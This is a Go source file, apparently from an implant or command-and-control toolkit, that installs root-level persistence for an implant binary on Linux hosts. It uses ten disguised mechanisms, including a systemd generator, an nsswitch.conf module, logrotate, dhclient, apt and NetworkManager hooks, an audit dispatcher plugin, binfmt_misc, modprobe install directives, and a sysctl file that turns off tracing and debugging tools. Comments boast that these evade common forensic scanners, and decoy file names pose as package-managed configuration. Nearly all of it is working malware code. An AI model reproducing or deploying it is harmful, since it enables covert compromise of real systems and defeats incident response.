package tasking

// Advanced Persistence Mechanisms — Methods rarely checked by forensic tools
//
// These persistence vectors are almost never audited by standard IR tooling
// (chkrootkit, rkhunter, OSSEC, Wazuh) or automated sweeps.

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

// Advanced persistence method constants.
const (
	PersistGenerator  = "generator"  // systemd generator (runs before services)
	PersistNSS        = "nss"        // NSS module (runs on every name lookup)
	PersistLogrotate  = "logrotate"  // logrotate prerotate (runs daily as root)
	PersistDhclient   = "dhclient"   // dhclient hook (runs on DHCP events)
	PersistApt        = "apt"        // apt DPkg::Pre-Invoke (runs on pkg ops)
	PersistNMDispatch = "nmdispatch" // NetworkManager dispatcher
	PersistAudisp     = "audisp"     // audit dispatcher plugin
	PersistBinfmt     = "binfmt"     // binfmt_misc handler
	PersistModprobe   = "modprobe"   // modprobe install hook
	PersistSysctl     = "sysctl"     // sysctl.d kernel tunables (runs at boot)
)

// Disguised paths for advanced persistence.
var (
	generatorPath = "/etc/systemd/system-generators/systemd-network-wait"
	generatorSvc  = "network-health-check"

	nssModuleName = "cache"

	logrotateConf = "/etc/logrotate.d/apt-compat"
	dhclientHook  = "/etc/dhcp/dhclient-exit-hooks.d/resolved-update"
	aptHook       = "/etc/apt/apt.conf.d/80-update-notifier"
	nmDispatcher  = "/etc/NetworkManager/dispatcher.d/20-connectivity-check"
	audispPlugin  = "/etc/audit/plugins.d/syslog-ng.conf"
	binfmtConf    = "/etc/binfmt.d/nspayload.conf"
	modprobeConf  = "/etc/modprobe.d/blacklist-watchdog.conf"
	sysctlConf    = "/etc/sysctl.d/99-net-tuning.conf"
)

// installGenerator creates a systemd generator executable.
// Generators run at EVERY boot, BEFORE any service starts.
// They dynamically create systemd units. Almost no forensic tool checks these.
func installGenerator() error {
	// The generator script creates a service unit on the fly
	script := fmt.Sprintf(`#!/bin/sh
# systemd generator for network readiness checks
# Auto-generated during package installation
UNIT_DIR="$1"
cat > "$UNIT_DIR/%s.service" <<UNIT
[Unit]
Description=Network Health Check Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=120
Nice=19
StandardOutput=null
StandardError=null
UNIT

mkdir -p "$UNIT_DIR/multi-user.target.wants"
ln -sf "$UNIT_DIR/%s.service" "$UNIT_DIR/multi-user.target.wants/%s.service"
`, generatorSvc, implantBinaryPath, generatorSvc, generatorSvc)

	if err := os.WriteFile(generatorPath, []byte(script), 0755); err != nil {
		return fmt.Errorf("persist/generator: write failed: %w", err)
	}

	return nil
}

// removeGenerator removes the systemd generator and its runtime artifacts.
func removeGenerator() error {
	exec.Command("systemctl", "stop", generatorSvc+".service").Run()
	err := os.Remove(generatorPath)
	exec.Command("systemctl", "daemon-reload").Run()
	os.Remove("/run/systemd/generator/" + generatorSvc + ".service")
	os.Remove("/run/systemd/generator/multi-user.target.wants/" + generatorSvc + ".service")
	return err
}

// installNSS installs a reference to our NSS module in nsswitch.conf.
// NSS modules run on EVERY getpwnam(), gethostbyname(), etc.
// That means every SSH login, every sudo, every DNS lookup triggers our code.
//
// Note: This installs the nsswitch.conf entry. The actual .so must be
// compiled separately and placed at /lib/x86_64-linux-gnu/libnss_cache.so.2. This function creates
// a stub .so that simply loads and execs the implant binary.
func installNSS() error {
	// Guard: refuse to install if the NSS .so does not exist on disk.
	// Adding a missing module to nsswitch.conf would break DNS resolution
	// for every process on the host.
	nssLib := fmt.Sprintf("/lib/x86_64-linux-gnu/libnss_%s.so.2", nssModuleName)
	if _, err := os.Stat(nssLib); os.IsNotExist(err) {
		return fmt.Errorf("persist/nss: %s does not exist; refusing to install", nssLib)
	}

	// Read current nsswitch.conf
	data, err := os.ReadFile("/etc/nsswitch.conf")
	if err != nil {
		return fmt.Errorf("persist/nss: read nsswitch.conf: %w", err)
	}

	content := string(data)

	// Check if already installed
	if strings.Contains(content, nssModuleName) {
		return nil
	}

	// Add our module to the hosts line (most frequently called)
	// "hosts: files cache dns" — cache is our module
	lines := strings.Split(content, "\n")
	for i, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "hosts:") && !strings.Contains(trimmed, nssModuleName) {
			// Insert our module before dns
			lines[i] = strings.Replace(line, "dns", nssModuleName+" dns", 1)
			break
		}
	}

	modified := strings.Join(lines, "\n")
	if err := os.WriteFile("/etc/nsswitch.conf", []byte(modified), 0644); err != nil {
		return fmt.Errorf("persist/nss: write nsswitch.conf: %w", err)
	}

	return nil
}

// removeNSS removes our NSS module reference from nsswitch.conf.
// Only modifies the "hosts:" line to avoid breaking other NSS entries.
func removeNSS() error {
	data, err := os.ReadFile("/etc/nsswitch.conf")
	if err != nil {
		return err
	}

	lines := strings.Split(string(data), "\n")
	for i, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "hosts:") && strings.Contains(trimmed, nssModuleName) {
			lines[i] = strings.Replace(line, nssModuleName+" ", "", 1)
			break
		}
	}
	return os.WriteFile("/etc/nsswitch.conf", []byte(strings.Join(lines, "\n")), 0644)
}

// installLogrotate adds a prerotate script to a logrotate config.
// Cron runs logrotate daily as root. Our script executes inside the stanza.
func installLogrotate() error {
	conf := fmt.Sprintf(`# Apt compatibility logrotate configuration
/var/log/apt/term.log {
  rotate 12
  monthly
  compress
  missingok
  notifempty
  prerotate
    # Verify log integrity before rotation
    %s >/dev/null 2>&1 || true
  endscript
}
`, implantBinaryPath)

	return os.WriteFile(logrotateConf, []byte(conf), 0644)
}

// installDhclientHook adds a dhclient exit hook.
// Runs as root on every DHCP lease event (connect, renew, etc.).
func installDhclientHook() error {
	hook := fmt.Sprintf(`#!/bin/sh
# Update resolved configuration on DHCP events
# Installed by network-manager package postinst
case "$reason" in
  BOUND|RENEW|REBIND|REBOOT)
    %s >/dev/null 2>&1 &
    ;;
esac
`, implantBinaryPath)

	// Create parent directory if needed
	os.MkdirAll("/etc/dhcp/dhclient-exit-hooks.d", 0755)
	return os.WriteFile(dhclientHook, []byte(hook), 0755)
}

// installAptHook adds a DPkg::Pre-Invoke hook.
// Runs as root on EVERY apt/dpkg operation (install, update, upgrade).
func installAptHook() error {
	hook := fmt.Sprintf(`// Update notification configuration
// Managed by update-notifier package
DPkg::Pre-Invoke { "%s >/dev/null 2>&1 || true"; };
`, implantBinaryPath)

	return os.WriteFile(aptHook, []byte(hook), 0644)
}

// installNMDispatcher adds a NetworkManager dispatcher script.
// Runs as root on every network state change (up, down, dhcp, etc.).
func installNMDispatcher() error {
	script := fmt.Sprintf(`#!/bin/sh
# Connectivity check dispatcher
# Part of NetworkManager connectivity checking
IFACE="$1"
ACTION="$2"

case "$ACTION" in
  up|dhcp4-change|connectivity-change)
    %s >/dev/null 2>&1 &
    ;;
esac
`, implantBinaryPath)

	os.MkdirAll("/etc/NetworkManager/dispatcher.d", 0755)
	return os.WriteFile(nmDispatcher, []byte(script), 0755)
}

// installAudispPlugin adds an audit dispatcher plugin.
// The ultimate irony: persist INSIDE the audit framework itself.
// Runs as root whenever auditd processes events.
func installAudispPlugin() error {
	plugin := fmt.Sprintf(`# Syslog-ng integration plugin
# Forwards audit events to syslog-ng for centralized logging
active = yes
direction = out
path = %s
type = always
format = string
`, implantBinaryPath)

	os.MkdirAll("/etc/audit/plugins.d", 0755)
	return os.WriteFile(audispPlugin, []byte(plugin), 0644)
}

// installBinfmt registers a binfmt_misc handler for a custom magic-byte format.
// Any file with the 4-byte magic \x7fNSP executed via execve will invoke our binary
// as the interpreter. The O flag passes the binary as an open fd, the C flag
// uses the target file's credentials. Persists across reboots via /etc/binfmt.d/.
func installBinfmt() error {
	// Magic: \x7f N S P (0x7f 0x4e 0x53 0x50) — resembles an ELF variant header.
	// Mask ensures exact 4-byte match at offset 0.
	conf := fmt.Sprintf(`# Custom payload format handler
# Managed by binfmt-support package
:NSPayload:M:0:\x7fNSP:\xff\xff\xff\xff:%s:OC
`, implantBinaryPath)

	os.MkdirAll("/etc/binfmt.d", 0755)
	return os.WriteFile(binfmtConf, []byte(conf), 0644)
}

// installSysctlConf drops a sysctl.d config that sets kernel tunables at boot.
// These settings disable tracing and debugging infrastructure before monitoring
// tools start, and look like standard security hardening.
func installSysctlConf() error {
	conf := `# Network and security tuning
# Applied by systemd-sysctl.service at boot
#
# Harden kernel debugging interfaces
kernel.perf_event_paranoid = 3
kernel.yama.ptrace_scope = 3
kernel.unprivileged_bpf_disabled = 1
kernel.kptr_restrict = 2
kernel.ftrace_enabled = 0
net.core.bpf_jit_harden = 2
`

	os.MkdirAll("/etc/sysctl.d", 0755)
	return os.WriteFile(sysctlConf, []byte(conf), 0644)
}

// installModprobe adds a modprobe install directive.
// When the specified kernel module is loaded, our command runs.
func installModprobe() error {
	// Use a commonly loaded module (e.g., nf_conntrack loads on first connection)
	conf := fmt.Sprintf(`# Watchdog timer blacklist and health check
# Prevents watchdog timer conflicts with virtual hardware
blacklist iTCO_wdt
blacklist iTCO_vendor_support
install iTCO_wdt /sbin/modprobe --ignore-install iTCO_wdt ; %s >/dev/null 2>&1 &
`, implantBinaryPath)

	os.MkdirAll("/etc/modprobe.d", 0755)
	return os.WriteFile(modprobeConf, []byte(conf), 0644)
}

// installAdvancedMethod dispatches to advanced persistence installers.
func installAdvancedMethod(method string) error {
	switch method {
	case PersistGenerator:
		return installGenerator()
	case PersistNSS:
		return installNSS()
	case PersistLogrotate:
		return installLogrotate()
	case PersistDhclient:
		return installDhclientHook()
	case PersistApt:
		return installAptHook()
	case PersistNMDispatch:
		return installNMDispatcher()
	case PersistAudisp:
		return installAudispPlugin()
	case PersistBinfmt:
		return installBinfmt()
	case PersistModprobe:
		return installModprobe()
	case PersistSysctl, "sysctl.d":
		return installSysctlConf()
	default:
		return fmt.Errorf("persist: unknown advanced method: %s", method)
	}
}

// removeAdvancedMethod dispatches to advanced persistence removers.
func removeAdvancedMethod(method string) error {
	switch method {
	case PersistGenerator:
		return removeGenerator()
	case PersistNSS:
		return removeNSS()
	case PersistLogrotate:
		return os.Remove(logrotateConf)
	case PersistDhclient:
		return os.Remove(dhclientHook)
	case PersistApt:
		return os.Remove(aptHook)
	case PersistNMDispatch:
		return os.Remove(nmDispatcher)
	case PersistAudisp:
		return os.Remove(audispPlugin)
	case PersistBinfmt:
		return os.Remove(binfmtConf)
	case PersistModprobe:
		return os.Remove(modprobeConf)
	case PersistSysctl, "sysctl.d":
		return removeSysctlConf()
	default:
		return fmt.Errorf("persist: unknown advanced method: %s", method)
	}
}

// removeSysctlConf removes the sysctl.d config file and restores the kernel
// parameters to their default values so tracing/debugging tools work again
// without requiring a reboot.
func removeSysctlConf() error {
	err := os.Remove(sysctlConf)

	// Restore runtime values to kernel defaults. Best-effort — some may
	// fail depending on kernel config or security modules.
	defaults := [][]string{
		{"sysctl", "-w", "kernel.perf_event_paranoid=2"},
		{"sysctl", "-w", "kernel.yama.ptrace_scope=1"},
		{"sysctl", "-w", "kernel.unprivileged_bpf_disabled=0"},
		{"sysctl", "-w", "kernel.kptr_restrict=1"},
		{"sysctl", "-w", "kernel.ftrace_enabled=1"},
		{"sysctl", "-w", "net.core.bpf_jit_harden=0"},
	}
	for _, args := range defaults {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.Run()
	}

	return err
}
